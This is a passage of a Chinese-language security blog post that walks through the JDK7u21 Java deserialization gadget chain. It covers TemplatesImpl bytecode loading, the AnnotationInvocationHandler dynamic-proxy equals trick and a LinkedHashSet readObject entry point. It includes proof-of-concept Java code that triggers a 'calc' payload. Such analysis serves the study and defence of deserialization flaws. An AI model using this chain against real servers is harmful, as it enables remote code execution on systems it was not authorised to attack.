class="keyword">byte</span>[][]&#123;lalaByteCodes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        Reflections.setFieldValue(templates,<span class="string">"_bytecodes"</span>,targetByteCodes);</span><br><span class="line">        Reflections.setFieldValue(templates,<span class="string">"_name"</span>,<span class="string">"lala"</span>+System.nanoTime());</span><br><span class="line">Reflections.setFieldValue(templates,<span class="string">"_class"</span>,<span class="keyword">null</span>);</span><br><span class="line">        Reflections.setFieldValue(templates,<span class="string">"_tfactory"</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">        <span class="comment">//一样可以触发</span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p> 以上需要注意一个情况，我们的恶意字节码类lala类，使用了static修饰符。其实我们payload写在构造函数中是可以不使用static修饰符不会影响。</p><p>但是如果我们想把payload写在static初始化块中，类就需要使用static修饰符时。不然最后实例化是不会成功的。</p><p>就相当于是以下的情况，内部类是不允许存在static修饰符的，原理可以<a href="https://blog.csdn.net/u010454030/article/details/80548732" target="_blank" rel="noopener">参考</a>。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9rk9yjlj30ky06ut8r.jpg" alt="static问题.png"></p><p>ps.突然发现非static方法块也是可以写payload…..但是不纠结这个了！！</p></blockquote><p>至此我们完成了恶意Templates类构造以及<code>TemplatesImpl.getOutputProperties</code>触发点的分析（当然从上面的调用过程，我们知道直接调用<code>TemplatesImpl.newTransformer()</code>也是一样的，getOutputProperties其实就是调用了newTransformer()，在接下来的延长链中其实漏洞触发是在newTransformer）。</p><p>目前的结论已经可以移花接木到fastjson的利用链中形成一套完成利用链。以及其他很多组件的利用链的最后一步都是TemplatesImpl类（限于jdk1.7版本，1.8会编译错误，原因未知）。</p><p>但是就单独作为一条利用链来说，只有exp触发点和一点点长度的利用链是不够的，我们需要继续延伸到一个反序列化readObject点，使服务端一触发反序列化，就可以沿着利用链到exp触发点。</p><h2 id="延长利用链——AnnotationInvocationHandler"><a href="#延长利用链——AnnotationInvocationHandler" class="headerlink" title="延长利用链——AnnotationInvocationHandler"></a>延长利用链——AnnotationInvocationHandler</h2><p>AnnotationInvocationHandler这是一个熟悉的类，在commons-collections一文的1.7最基础的利用链中，我们正是使用了AnnotationInvocationHandler的readobject函数作为反序列化入口点。</p><p>然而这里跟AnnotationInvocationHandler的invoke函数有关。在这之前我们需要先了解java的动态代理性质。</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>动态代理是java的特性之一，其实就可以理解为web应用中的拦截器，在执行正式代码之前先过一个拦截器函数（比如spring的AOP）。但是以上类比只是为了便于理解，实际上spring的AOP之类的拦截器反而是基于java的动态代理实现的。</p><p>下面将举例动态代理SubjectImpl类，即在SubjectImple类前面建立一个拦截器。</p><p><code>DynamicProxy.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要实现的接口（拦截动作是基于接口的，所以需要设定接口）</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">ISubject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String str)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际的需要被代理的对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubjectImpl</span> <span class="keyword">implements</span> <span class="title">ISubject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SubjectImpl.hello(): "</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handler对象（继承InvocationHandler的拦截器）</span></span><br><span class="line"><span class="comment">//InvocationHandler是一个用于跟Proxy类对接的接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object subject;</span><br><span class="line">    <span class="comment">//构造函数，传入被代理实现类的实例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Handler</span><span class="params">(Object subject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//所有被Proxy拦截的函数都会经过这个接口的invoke函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object object, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"before!"</span>);</span><br><span class="line">        <span class="comment">//完成拦截操作之后去调用被代理实现类，反射机制，传入实例，参数</span></span><br><span class="line">        method.invoke(<span class="keyword">this</span>.subject, args);</span><br><span class="line">        System.out.println(<span class="string">"after!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//被代理类</span></span><br><span class="line">        SubjectImpl subject = <span class="keyword">new</span> SubjectImpl();</span><br><span class="line">        <span class="comment">//拦截器实现类，通过构造函数传入被代理类的实例</span></span><br><span class="line">        InvocationHandler tempHandler = <span class="keyword">new</span> Handler(subject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Proxy.newProxyInstance创建代理</span></span><br><span class="line">        ISubject iSubject = (ISubject) Proxy.newProxyInstance(DynamicProxy.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[] &#123;ISubject.class&#125;, tempHandler);</span><br><span class="line">        iSubject.hello(<span class="string">"world!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Proxy.newProxyInstance</code>三个传入参数：</p><ul><li>loader，选用的类加载器。感觉随便选就好了。</li><li>interfaces，被代理类所实现的接口，这个接口可以是多个。（即需要拦截的接口）</li><li>h，一个 实现拦截器的invocation handler。</li></ul><p>之后只要我们调用了返回之后的对象中被安排了代理的接口，就会进入invocationHandler的invoke函数。</p><p>以上执行结果就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before!</span><br><span class="line">SubjectImpl.hello(): world!</span><br><span class="line">after!</span><br></pre></td></tr></table></figure><p>那么动态代理大概就分为几个部分：</p><ol><li>被代理的接口类</li><li>被代理的接口类的实现类</li><li>继承InvocationHandler接口、实现invoke方法的拦截器类</li><li>Proxy.newProxyInstance完成拦截器，与被代理的接口类的绑定</li><li>调用这个返回对象的被代理接口即可。（此处注意这个返回的对象不是只有被代理的接口类中的接口，还有一些常用接口，之后会截图说明。）</li></ol><p>我们说了那么多动态代理机制，是为啥呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//实现了InvocationHandler接口的invoke函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是因为AnnotationInvocationHandler类其实是一个InvocationHandler接口的实现类。它不只是在cc的利用链中作为反序列化点，还是作为动态代理的拦截器实现函数(有一个自己的invoke方法)</p><h3 id="动态代理链接AnnotationInvocationHandler与Templates"><a href="#动态代理链接AnnotationInvocationHandler与Templates" class="headerlink" title="动态代理链接AnnotationInvocationHandler与Templates"></a>动态代理链接AnnotationInvocationHandler与Templates</h3><p>我们的目的是连接代理后的对象Proxy的equal方法到Templates的newTransformer方法。</p><p>当建立动态代理后（Proxy.newInstance返回一个对象a），我们假设调用a.b(c)</p><p>先瞅一眼AnnotationInvocationHandler的构造函数有个底，我们可以知道有可控的this.type与this.memberValues</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    <span class="keyword">this</span>.type = var1;</span><br><span class="line">    <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>bytheway，这里的AnnotationInvocationHandler构造函数是缺省修饰符，它在不同的包中是不能直接调用的。</p><p>反射机制中有说到，可以使用setAccessible(true)来开放权限。</p></blockquote><p>调用a.b(c)。 <code>sun.reflect.annotation.AnnotationInvocationHandler#invoke</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var1 当前的Proxy代理实例对象，即a.b(c)的a</span></span><br><span class="line"><span class="comment">//var2 当前调用的方法，即a.b(c)的b</span></span><br><span class="line"><span class="comment">//var3 当前调用方法的传入参数列表，即a.b(c)的c</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">        String var4 = var2.getName();<span class="comment">//被调用方法名</span></span><br><span class="line">        Class[] var5 = var2.getParameterTypes();<span class="comment">//获取传入参数类型列表</span></span><br><span class="line">    <span class="comment">//如果调用的方法名是equals，传入一个参数，并且为Object类型,即a.equal((Object.class)c)</span></span><br><span class="line">    <span class="comment">//此处的意思应该为判断a是否与传入的c完全相等。</span></span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);<span class="comment">//我们进入此处，传入的是a.b(c)中的c的第一个参数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var1 a.b(c)的c</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// var1 若为AnnotationInvocationHandler类，就相等</span></span><br><span class="line">        <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment">// var1 应该为this.type的实例 （此处为一个要求）</span></span><br><span class="line">        <span class="comment">// 此处意思应该是只能比较this.type中规定好的类是否完全一致</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//如果是this.type（可控）中的类的实例的话</span></span><br><span class="line">            <span class="comment">//就要开始获取this.type这个类中的所有方法</span></span><br><span class="line">            Method[] var2 = <span class="keyword">this</span>.getMemberMethods();</span><br><span class="line">            <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line">   <span class="comment">//去对应着遍历调用c对象中的Methods方法</span></span><br><span class="line">            <span class="comment">//把结果与在构造函数中定义的this.memberValues做对比，若一样则判定相等</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">                Method var5 = var2[var4];<span class="comment">//遍历获取方法</span></span><br><span class="line">                String var6 = var5.getName();<span class="comment">//获取方法名字</span></span><br><span class="line">                Object var7 = <span class="keyword">this</span>.memberValues.get(var6);<span class="comment">//获取我们控制的menberValues中的值</span></span><br><span class="line">                Object var8 = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">//看看var1是不是也是一个代理类，如果是获取它的代理实现类（这里没用）</span></span><br><span class="line">                AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);</span><br><span class="line">                <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var8 = var9.memberValues.get(var6);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//不是代理类，进入此处</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        var8 = var5.invoke(var1);<span class="comment">//反射调用！！！！</span></span><br><span class="line">                        <span class="comment">//这里的意思就是 var1.var5()</span></span><br><span class="line">                        <span class="comment">//根据this.type类型遍历所有方法，调用传入参数var1中的所有对应方法。</span></span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//该函数原本的功能 需要比较下调用返回结果与预设值一样不。</span></span><br><span class="line">                <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>equals方法会根据this.type类中的方法去遍历调用传入对象中的所有对应的方法。那么！</p><ol><li><p>我们可以构筑一个AnnotationInvocationHandler类，构造函数中选择一个this.type，this.type这个类中需要包含我们要恶意执行的方法。</p></li><li><p>把这个AnnotationInvocationHandler类与随便什么接口进行绑定（因为我们需要调用的是equals，只要是一个Object对象就会有equals方法 maybe？）</p><p> <img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9svznu1j30xk0nxwh4.jpg" alt="代理接口有equals.png"></p></li><li><p>调用这个代理类的equals方法，同时給入恶意实例，就会遍历this.type这个类中的方法对恶意实例中的对应方法进行调用。唯一的缺点就是调用的方法不能传入参数。（因为<code>var5.invoke(var1);</code>只传入了对象，没有传入参数）</p></li></ol><p>我们需要调用的是<code>TemplatesImpl.newTransformer()</code>，刚好这个方法不需要传入参数！</p><p>再是this.type=Templates.class，因为TemplatesImpl继承自Templates接口，并且它有我们要的方法，并且在第一个（为啥需要恰好又刚好在第一个，之后有说法）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Templates</span> </span>&#123;</span><br><span class="line">    <span class="function">Transformer <span class="title">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException</span>; </span><br><span class="line">    <span class="function">Properties <span class="title">getOutputProperties</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给出poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//AnnotationInvocationHandler构造函数的this.memberValues</span></span><br><span class="line">    Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">//获取AnnotationInvocationHandler构造函数</span></span><br><span class="line">    <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">//由于是缺省修饰符，不同的包，不能直接调用。允许调用</span></span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//创建AnnotationInvocationHandler实例，this.type=Templates.class</span></span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);</span><br><span class="line">    <span class="comment">//Override是一个啥都没有的接口，这里用这个类，表示其实绑定啥都没关系</span></span><br><span class="line">    <span class="comment">//在高版本的jdk中，在构造函数中对于type做了校验，如果要在高版本中构造payload，需要使用反射机制构筑。如果对方也是高版本的jdk（即经过了修复）那么我们构筑的InvocationHandler类也是因为构造方法通过不了而无法利用。具体我们在后面修复情况中说到。</span></span><br><span class="line">    <span class="comment">//InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class,map);</span></span><br><span class="line">     <span class="comment">//Reflections.setFieldValue(tempHandler, "type", Templates.class);</span></span><br><span class="line">    <span class="comment">//有些地方POC写的是Templates.class类，其实没必要</span></span><br><span class="line">    Override proxy = (Override) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Override.class&#125;,invocationHandler);</span><br><span class="line">    <span class="comment">//恶意类</span></span><br><span class="line">    <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(<span class="string">"calc"</span>);</span><br><span class="line">    <span class="comment">//调用，执行`TemplatesImpl.newTransformer()`</span></span><br><span class="line">    proxy.equals(templates);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="this-type的讲究"><a href="#this-type的讲究" class="headerlink" title="this.type的讲究"></a>this.type的讲究</h4><p>为啥this.type需要选用类中第一个方法是我们需要调用的方法的类呢？</p><p>因为不是的话，就需要考虑更多，比如报错退出。可以看到在执行完我们的payload后是会报错退出的，当然这对我们paylaod的执行没有影响。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9twkj0rj323212u7ld.jpg" alt="newTransformer执行的命令.png"></p><p>但是假如我们需要调用的方法不在第一个，而前面是一个需要参数的方法，就会因为没有传入参数而报错退出。（比如我们把Templates.class改成TemplatesImpl.class）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9u9k0lzj31x70z579a.jpg" alt="TemplatesImple_type报错.png"></p><p>如果我们需要调用的方法前面有一些其他方法，但是都是不需要参数的，我们还需要构造this.memberValues，让前面这些函数的返回值与this.menberValues里面一致才不会返回false退出。就会有一串的麻烦（目前来看这样也是可行的，但是假如这里真的改了this.memberValues之后LinkedHashSet那关就过不去了！实际上我们只能且必须要找到一个第一个方法是能够代码执行的方法！）</p><p>所幸我们可以找到一个Templates类，它进行代码执行的方法是第一个，万幸。</p><h2 id="进一步延伸至LinkedHashSet"><a href="#进一步延伸至LinkedHashSet" class="headerlink" title="进一步延伸至LinkedHashSet"></a>进一步延伸至LinkedHashSet</h2><p>接下来需要触发<code>proxy.equals(templates)</code>，这种<code>a.equals(b)</code>的形式。a是我们构建的动态代理返回对象，b是恶意TemplatesImpl类。</p><p><strong>LinkedHashSet类</strong>继承自<strong>Hashset</strong>，具有Hashset的全部特点：元素不重复，快速查找，快速插入。新增的特性是有序，数据结构上使用双向链表实现。（之所以用LinkedHashSet就是因为其有序的特性，后面会说到为什么需要有序）</p><p><code>LinkedHashSet.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedHashSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">HashSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//给一个我们要用到的构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedHashSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(<span class="number">16</span>, .<span class="number">75f</span>, <span class="keyword">true</span>);<span class="comment">//进去这里看看</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//LinkedHashSet这个类其实根本没有自己实现过类，只有四个构造函数，实际上使用LinkedHashMap实现有序功能的</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>super就进入HashSet了，<code>HashSet.java</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashSet(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor, <span class="keyword">boolean</span> dummy) &#123;</span><br><span class="line">    map = <span class="keyword">new</span> LinkedHashMap&lt;&gt;(initialCapacity, loadFactor);<span class="comment">//可以看到使用LinkedHashMap创建了有序集合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体是如何实现这个集合的，我们就不纠结了。我们需要通过LinkedHashSet连接<strong>writeObject序列化与readObject反序列化</strong>这个利用链入口至<strong>a.equals(b)</strong>这个我们之前得到的触发点。</p><p>先看LinkedHashSet的序列化与反序列化。LinkedHashSet获取的是LinkedHashMap的实例，而LinkedHashMap又继承自HashSet，所以最终的序列化与反序列化就是在<code>HashSet类</code>中。</p><p>我们跟着反序列化触发链来看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//我们构造payload，最终调用writeObject </span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 序列化任何隐藏的序列化魔术（不懂什么骚操作）</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化map的容量与加载器</span></span><br><span class="line">        s.writeInt(map.capacity());</span><br><span class="line">        s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化map的大小</span></span><br><span class="line">        s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历序列化每一个map中的元素</span></span><br><span class="line">        <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">            s.writeObject(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在服务端触发payload，最先触发的函数。</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// 反序列化任何隐藏的序列化魔术（不懂什么骚操作）</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化HashMap容量和加载器并创建备份HashMap</span></span><br><span class="line">        <span class="keyword">int</span> capacity = s.readInt();</span><br><span class="line">        <span class="keyword">float</span> loadFactor = s.readFloat();</span><br><span class="line">        map = (((HashSet)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化map的大小</span></span><br><span class="line">        <span class="keyword">int</span> size = s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历反序列化每一个map的元素，并把他们加入到map中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            E e = (E) s.readObject();<span class="comment">//获取我们每一个map元素</span></span><br><span class="line">            map.put(e, PRESENT);<span class="comment">//重新放入map中，我们进入此处,就是出在这里。</span></span><br><span class="line">            <span class="comment">//e为我们map的元素，present是一个常量，就是一个新的object对象</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>java.util.HashMap#put</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 